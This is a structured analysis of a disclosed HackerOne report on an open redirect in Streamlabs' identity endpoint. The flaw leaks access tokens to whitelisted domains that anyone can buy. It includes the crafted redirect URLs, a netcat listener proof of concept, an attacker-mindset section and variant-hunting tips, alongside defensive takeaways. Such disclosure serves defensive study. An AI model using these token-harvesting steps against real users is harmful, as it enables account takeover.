# Account Takeover via Open Redirect - Unvalidated Whitelist Domain in Streamlabs Identity Endpoint

## Metadata
- **Source:** HackerOne
- **Report:** 1327742 | https://hackerone.com/reports/1327742
- **Submitted:** 2021-09-02
- **Reporter:** sudi
- **Program:** Streamlabs on HackerOne
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Open Redirect, Improper Input Validation, Account Takeover, Token Leakage, Broken Authentication
- **CVEs:** None
- **Category:** uncategorised

## Summary
The identity endpoint at streamlabs.com/global/identity contains an open redirect vulnerability in the 'r' parameter that allows redirecting to attacker-controlled domains with valid TLDs. Three whitelisted domains (dragynslair.live, darthvapes.tv, nixxiom.tv) were found to be available for purchase, enabling attackers to register these domains and harvest access tokens from all redirected users.

## Attack scenario
1. Attacker discovers that dragynslair.live domain is in the redirect whitelist but available for public registration
2. Attacker purchases dragynslair.live domain for $3 and sets up a basic web server to capture HTTP requests
3. Attacker crafts malicious URL: https://streamlabs.com/global/identity?popup=1&r=https://dragynslair.live/ and distributes via phishing/social engineering
4. Authenticated Streamlabs user visits the attacker's link, triggering authentication and redirect flow
5. Streamlabs redirects to attacker's newly-registered domain with access_token as query parameter
6. Attacker captures the access_token from HTTP request and uses it to compromise victim's Streamlabs account via API endpoints

## Root cause
The application maintains a whitelist of allowed redirect domains, but the whitelist included domains that were not actively owned or controlled by Streamlabs. The validation logic checked domain ownership status at some historical point but did not account for domain expiration, non-renewal, or availability for re-registration. Additionally, the sensitive access_token was passed via URL query parameter rather than secure mechanisms.

## Attacker mindset
This is a high-impact vulnerability requiring minimal effort and cost ($3 domain registration). The attacker exploits the gap between whitelist maintenance and actual domain ownership, turning a legacy redirect list into an attack vector. The ability to harvest tokens at scale through a simple phishing link makes this exceptionally valuable.

## Defensive takeaways
- Never whitelist domains you don't actively control or own; validate continued ownership periodically
- Implement dynamic domain ownership verification rather than static whitelists
- Never transmit sensitive tokens (access_token, refresh_token) via URL query parameters; use secure HTTP headers or POST bodies
- Implement redirect validation that checks not just the domain but DNS records or WHOIS to confirm current ownership
- Use strict redirect-uri validation similar to OAuth 2.0 standards with exact URI matching, not just domain matching
- Set short expiration times on access tokens to limit window of exploitation
- Implement token binding or additional verification steps for high-risk operations
- Monitor for suspicious redirect patterns or tokens being used from unexpected locations
- Require explicit user consent before redirects to external domains with sensitive parameters

## Variant hunting
Search for other endpoints using the 'r' parameter or similar redirect mechanisms. Check other Streamlabs subdomains and properties for similar whitelisted domains. Look for expired domains in previous security disclosures. Review wayback machine snapshots of redirect parameters across multiple services. Test for token leakage through referrer headers, browser history, or access logs of old services.

## MITRE ATT&CK
- T1190
- T1598
- T1557
- T1539
- T1563

## Notes
This is a follow-up to report #1178239 which patched the issue for streamlabs.com and merch.streamlabs.com but left the underlying vulnerability in unowned whitelisted domains. The researcher demonstrated excellent methodology by using /etc/hosts to prove impact without purchasing the domain. The vulnerability highlights the danger of maintaining redirect whitelists without continuous ownership verification. The fact that multiple domains were available for purchase suggests this vulnerability could have been exploited by any attacker with minimal resources.

## Full report
<details><summary>Expand</summary>

Heyy there,
After  reading the disclosed report #1178239, I started to look for bypasses but I found that it's restricted to only streamlabs.com and merch.streamlabs.com , providing any other domain or subdomain of streamlabs.com gives an error instead of the 302 redirect.

From wayback machine (https://web.archive.org/), I found a bunch of domains which were  used in the redirect parameter `r`.
```
https://streamlabs.com/global/identity?r=https://darthvapes.tv
https://streamlabs.com/global/identity?r=https://dragynslair.live/
https://streamlabs.com/global/identity?r=https://franmg.net/merch
https://streamlabs.com/global/identity?r=https://itzyony2.com
https://streamlabs.com/global/identity?r=https://lmgtwitch.com
https://streamlabs.com/global/identity?r=https://maitresharinganv1.com
https://streamlabs.com/global/identity?r=https://themavshow.tv
https://streamlabs.com/global/identity?r=https://veterangamertv.com
https://streamlabs.com/global/identity?r=https://www.koopatroop.com
https://streamlabs.com/global/identity?r=https://www.lokenplays.com
https://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com
```

Visiting all these urls in my browser I found that only these 3 domains were allowed (the access_token was sent to this domains)
dragynslair.live
darthvapes.tv
nixxiom.tv


If an authenticated user visits this url, his access_token will be sent to the dragynslair.live domain:
https://streamlabs.com/global/identity?r=https://dragynslair.live/

{F1433713}
In this screenshot you can see that the `access_token` is added as a query parameter.

The most interesting thing about this particular domain is that it is available for registration, which you can verify from here:
https://www.name.com/domain/search/dragynslair.live

Anyone can buy this domain name for $3 , which will allow him to takeover any streamlab's user account 
{F1433718}

----------

**Steps to reproduce:**
As I haven't actually purchased this domain name `dragynslair.live` , to prove that I can steal the `access_token`. I will add dragynslair.live to my `/etc/hosts` file which will point to 127.0.0.1 and a web server wil be running on port 80 locally.
This should be enough to validate this finding.

1.Open your `/etc/hosts` file and add this line to it , save it
```bash
127.0.0.1  dragynslair.live
```
2.Now start a web server on port 80 by using this command  `sudo nc -lvk 80`
3.Open this url https://streamlabs.com/global/identity?popup=1&r=http://dragynslair.live (make sure the user is authenticated)
4.Check the ncat command output you should see the `access_token` parameter 

{F1433725}


This access_token then can be used in the following api endpoints: https://dev.streamlabs.com/reference

------------

## Impact

By just sending the url an attacker can steal victim's `access_token` which can be used in the streamlabs api endpoints.


Thankyou
Regards
Sudhanshu

</details>

---
*Analysed by Claude on 2026-05-24*
